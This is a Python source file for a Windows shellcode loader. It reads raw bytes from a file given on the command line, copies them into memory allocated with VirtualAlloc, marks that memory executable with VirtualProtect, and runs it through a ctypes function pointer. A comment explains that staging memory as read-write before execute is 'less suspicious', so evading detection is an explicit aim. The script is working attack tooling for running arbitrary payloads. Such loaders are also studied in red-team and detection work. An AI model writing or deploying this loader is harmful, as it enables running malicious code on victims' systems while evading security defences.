import sys
import ctypes
from ctypes import wintypes

# Extend wintypes for 64-bit compatibility to prevent AttributeError
# These types are crucial for ensuring pointers and sizes are handled correctly on x64.
wintypes.ULONGLONG = ctypes.c_ulonglong
wintypes.SIZE_T = ctypes.c_size_t
wintypes.LPDWORD = ctypes.POINTER(wintypes.DWORD)
wintypes.LPVOID = ctypes.c_void_p

# Windows API definitions with explicit argtypes and restypes for 64-bit safety
kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)

# VirtualAlloc: Reserves, commits, or changes the state of a region of pages in the virtual address space.
VirtualAlloc = kernel32.VirtualAlloc
VirtualAlloc.argtypes = [wintypes.LPVOID, wintypes.SIZE_T, wintypes.DWORD, wintypes.DWORD]
VirtualAlloc.restype = wintypes.LPVOID

# VirtualProtect: Changes the protection on a region of committed pages in the virtual address space.
VirtualProtect = kernel32.VirtualProtect
VirtualProtect.argtypes = [wintypes.LPVOID, wintypes.SIZE_T, wintypes.DWORD, wintypes.LPDWORD]
VirtualProtect.restype = wintypes.BOOL

# VirtualFree: Releases, decommits, or releases and decommits a region of pages within the virtual address space.
VirtualFree = kernel32.VirtualFree
VirtualFree.argtypes = [wintypes.LPVOID, wintypes.SIZE_T, wintypes.DWORD]
VirtualFree.restype = wintypes.BOOL

# Constants for memory allocation and protection
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
MEM_RELEASE = 0x8000
PAGE_READWRITE = 0x04
PAGE_EXECUTE_READ = 0x20

def main():    
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <path_to_shellcode.bin>")
        sys.exit(1)
    
    shellcode_path = sys.argv[1]
    try:
        with open(shellcode_path, 'rb') as f:
            payload = f.read()
    except FileNotFoundError:
        print(f"Error: File not found at '{shellcode_path}'")
        sys.exit(1)
    except Exception as e:
        print(f"An error occurred while reading the file: {e}")
        sys.exit(1)

    payload_len = len(payload)
    if payload_len == 0:
        print("Error: Shellcode file is empty.")
        sys.exit(1)

    # 1. Allocate memory with PAGE_READWRITE permissions. This is less suspicious than RWX.
    # We cast None to c_void_p for clarity, although it's not strictly required.
    exec_mem = VirtualAlloc(ctypes.c_void_p(0), payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
    if not exec_mem:
        print(f"Error: VirtualAlloc failed with code {ctypes.get_last_error()}")
        sys.exit(1)

    # 2. Copy the shellcode into the allocated memory.
    # from_buffer_copy is used to safely copy the bytes into a ctypes array.
    buffer = (ctypes.c_ubyte * payload_len).from_buffer_copy(payload)
    ctypes.memmove(ctypes.c_void_p(exec_mem), buffer, payload_len)
    
    # 3. Change memory protection to PAGE_EXECUTE_READ.
    # This makes the memory executable.
    old_protect = wintypes.DWORD(0)
    # Explicitly cast exec_mem to c_void_p to ensure correct pointer handling on x64
    protect_res = VirtualProtect(ctypes.c_void_p(exec_mem), payload_len, PAGE_EXECUTE_READ, ctypes.byref(old_protect))
    if not protect_res:
        print(f"Error: VirtualProtect failed with code {ctypes.get_last_error()}")
        VirtualFree(ctypes.c_void_p(exec_mem), 0, MEM_RELEASE)
        sys.exit(1)

    # 4. Create a function pointer to the shellcode and execute it.
    # CFUNCTYPE defines the function signature. The first argument is the return type (None for void).
    shellcode_func = ctypes.CFUNCTYPE(None)(exec_mem)
    shellcode_func()
    
    # 5. Clean up the allocated memory.
    free_res = VirtualFree(ctypes.c_void_p(exec_mem), 0, MEM_RELEASE)
    if not free_res:
        # This error is less critical as the payload has already run, but it's good practice to check.
        print(f"Warning: VirtualFree failed with code {ctypes.get_last_error()}")

    return 0

if __name__ == "__main__":
    main()